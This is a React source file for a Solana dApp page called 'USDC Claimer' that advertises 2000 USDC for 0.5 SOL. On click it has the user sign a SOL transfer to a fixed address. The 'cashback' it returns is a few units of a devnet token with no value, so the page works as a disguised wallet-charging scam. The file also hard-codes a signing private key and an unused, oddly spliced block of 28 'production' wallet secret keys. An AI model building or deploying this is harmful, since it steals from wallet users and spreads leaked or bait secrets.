/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2s38ceer7wTzEGmUxsiLMKKjM8PuoAYUX5i4xFiQ9GbR6oksuiC2TjyDBavfp6tje9BUv6TzeEETK74VEymaVAgu"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3G7iSJNUizu15oHki6YWzETxGVfAPK6n6d2G5quBDYkeQ68HeKcy8d2csVZyBtFeBquZuaWHVSCYiD6tdNXXJPCa",
  "key1": "2fUG7fMbWzWCDPTyeUndMqfYwTQLZZYG1ikjr1hCaSjWk7GppUmu4KxBQWYX7pE8iFDvwFioQf4k8Vtz4LvBNQTs",
  "key2": "4uVgXhPL4MnnubHuAboC79UkbZCv4YtoyBjLrHu76zQn89HLS1UQy17Tc8Qyh7ZuFrBUpZ5ptGHHEgagqg1P77jD",
  "key3": "hfaucQgSCT2UTTYbLQzWzFUcxDa4Mfcxt2YmY9hWWh4YTQkAFWhqRGnQP9Eo419TzUzdUxo9kmYRZDtPb4cXb61",
  "key4": "2F5ei6DUW7crWfVjH1mc8PTobfUAwEDfeggWWDynmL1s1B5NwJZYfvQuM9e9t3WmL7CCEgA9so5GQGXQPnMsoaDn",
  "key5": "3hTZ8CgKLLioccspu1DXys9JgfvVogsWMHoCuPyqv5WKg24jJ8NpJ4AdEEyJV5YYd8f6JWkQCVgrQLa9jQPHvRYB",
  "key6": "zevnHd3ZiSPsHgxPCpiCjfTaWTibNWUxUkrkX5hDoc4chw8Wxk8Ch2V1pFLYR6xXPGPpCDWpz5b7pBngpiAMYYF",
  "key7": "27QzT3z1Pw18w988DnYWcSYonsWANEe9uMQk1XyHNgre6qPPyJViDy1w2YXvVgVQnZW3eMvviLYTatKPwCPc3YTQ",
  "key8": "5c1mdESQvrse6DEyz6w8J8JBLBHLsonwNbSGwD1ytZFwEJBRPiKZY2PtbnL1UJHyYJJPQLcskc1gwk5M7gQfukTB",
  "key9": "2sZFKUbU3ZGNzMbkXmv9odkG7VquhUZCyTQrLcCjCEf6WdvRVUYFQrvpdvGo4ibYrJAhRnFsejYVRq4JufLYZ5XT",
  "key10": "3XyzgZeqUrKceSePzdhZtVRRy38RqDhZr6MsXTv5WNjSCvXjeYnQtoUTge5gr9Bqdiu3mpVXBctSFGyrUnhrXy4m",
  "key11": "3wQKQYVraaof1AVcgVzUGDRkKSozHt5SfjYnxP1uZthHp69vdb5qBtmjvC1zsnyMxwYcUN4HXeDTdSL5BTH6Gg6R",
  "key12": "4QTRWLYKWm63Q2UWXp5BXVa7C4s4SzvNd67DKtuRjPsR1ic8CiCwmyyDxL7EWYphwBLgj9dUHoKCUKk6p96cNyen",
  "key13": "3ERenZwjFEfuK6oZPjPsGnz1amBLiyxnzPpgY6YZTk3dW2zpUxZsMfnk7SEHFJf1xdwHCsRnWMxYkMLKB5yAFZdp",
  "key14": "8FCMFC8zBEo9iuG5wfTjcEmde26rqyJ2CZuXG3G9o9HeZJ1PgVgXLXdSKvWude4W4UG5CUX57VDwafbvxujU3Y9",
  "key15": "pN8XFpT4KXsc2d5Gb6Hedko8CwG57ctVYh8UEYiTPHqEJedkCjABHM8wRhu2hQjgm5hGqrDgkYRVLdUGJr2WhEq",
  "key16": "3aLqcRaa2kNJtMuuQehf3V9GB4F2Tdtt3HzazDRt87jXLUimrp3U2UnxVYU32AQiofXKpHmaQo3ztWwQMCdaEsHP",
  "key17": "2qNQWT6veoaA9NABGfW8NbgXzNd47E6bXwa5vQGDHNU5hpDXDg2ASuGaHhg3SMy3T38UF9yx7zLXBuArGqSMLTVx",
  "key18": "3XmtAcRDvneV43rYWcNosBNopQ5Y2B3QiTEQM6yC5ZGN5oqoz5ouXJercJiUzY6G34PWvY9LZw21nRteGCrrWCgT",
  "key19": "53Wzo858mGML8DZw9LRynnKcSiTB5khPpH58vfSJGGXynyrwMrN5LqaeTiRTxwMNNECtMHApaFeea34ARrzPszGL",
  "key20": "3sEU8azMHCWRmPyGuY4gpFG5eXoqzEAKemgx7ZzbXGuc8PqkKkiB8bSmGBgjhGvYbqBVk2YFwLR5Q7DGFJJkmCTh",
  "key21": "2AVydHjNpHDQqwCpsiCNMHykydNCiamKkhzewmTszG1QiWtzGc2bBtPa2yxChvu4qLqw5EtRq8WKAerLMoQhfhAU",
  "key22": "2M33UPcDokBQ1kAQ6fHzo2VXnB2Ub4MCRHa2rLDpiZnk4g6DRKgYh8RW2xD41fP5wqrbWhPpkjh1n2PJKGShENUJ",
  "key23": "3eaZoiGBZ4ubPj9rgTcGapNq5zjpzwxT2fHrNvH1rY35ppGXmhsdHLHv4Lwn9TQsctxNChcVe24PMxp4PBHejHrU",
  "key24": "2zUqqjAcJN6dnd3tB6KaDJSCjW2fZjQg7T5wzW3daE6P64JSmWvsce1pWa6Kios7bx3uiERqxMBWi3zHL1WkXGbg",
  "key25": "4scgAJUcuhm54wtz1Sjqv1QPEXmJU2VueaYMQqproPFKaTtoZC1zQfQu9p2QnMR8JStde9aBELsPqfnA6mxuxfQP",
  "key26": "4jxRQMmn734G8vRAH6ZpJuMvUgAaVP998VL94KBJSdCxrm1P3wozFLj3ETx95nxZqQDzuTsVZBCmKyfkKfpYwCHv",
  "key27": "3cbtGUPsekFP874PbFZ9h3Bk8ofXzRPZxEJL5KxZeR76rHt8xTrUz5AeK9YuDYWfb7Av7Qrh44Q146cyiMmjdon5"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
